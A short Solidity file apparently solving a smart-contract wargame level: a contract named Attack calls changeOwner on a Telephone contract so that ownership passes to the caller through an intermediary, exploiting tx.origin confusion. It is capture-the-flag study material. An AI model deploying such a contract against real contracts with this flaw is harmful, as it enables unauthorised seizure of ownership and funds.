// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

interface Telephone {
     function changeOwner(address _owner)external;
}


contract Attack {

    Telephone telephone;
constructor(address _contractAddress) {
    telephone = Telephone(_contractAddress);
}
function takeOwnership()public {
telephone.changeOwner(msg.sender);
}
}
